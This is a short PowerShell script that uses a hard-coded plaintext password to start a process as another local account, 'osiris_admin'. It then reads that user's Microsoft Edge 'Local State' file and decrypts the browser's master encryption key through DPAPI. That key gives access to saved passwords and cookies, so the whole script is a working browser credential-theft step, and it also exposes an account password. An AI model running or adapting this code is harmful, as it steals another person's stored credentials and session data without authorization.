# Try to use Start-Job with different credentials
$secpass = ConvertTo-SecureString "Pokemon55" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("laptop-nstd8t96\osiris_admin", $secpass)

# Try to spawn a process as osiris_admin
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -Command `"Write-Host 'Running as: ' + [Environment]::UserName; `$enc = Get-Content 'C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State' | ConvertFrom-Json; `$key = [System.Convert]::FromBase64String(`$enc.os_crypt.encrypted_key.Substring(5)); `$result = [System.Security.Cryptography.ProtectedData]::Unprotect(`$key, `$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); Write-Host ('Decrypted key: ' + [System.BitConverter]::ToString(`$result).Replace('-',''))`""
    $psi.UserName = "osiris_admin"
    $psi.Domain = "laptop-nstd8t96"
    $psi.Password = $secpass
    $psi.UseShellExecute = $false
    $psi.LoadUserProfile = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    
    $p = [System.Diagnostics.Process]::Start($psi)
    $output = $p.StandardOutput.ReadToEnd()
    $error = $p.StandardError.ReadToEnd()
    $p.WaitForExit()
    
    Write-Output "Output: $output"
    if ($error) { Write-Output "Error: $error" }
}
catch {
    Write-Output "Exception: $_"
}
